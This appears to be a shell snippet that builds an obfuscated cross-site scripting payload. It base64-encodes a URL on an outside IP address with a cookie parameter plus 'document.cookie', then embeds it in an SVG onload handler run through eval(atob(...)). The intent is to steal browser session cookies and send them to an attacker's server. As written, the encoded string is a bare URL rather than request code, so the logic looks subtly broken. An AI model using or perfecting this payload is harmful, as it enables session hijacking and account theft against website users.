URL="http://130.136.4.142:8080/?cookie="

ENC="document.cookie"
echo $URL$ENC | base64

HTML="<svg onload=eval(atob('$(echo -n $URL$ENC | base64)'))>"

echo $HTML
# <svg onload="eval(atob('...'))">
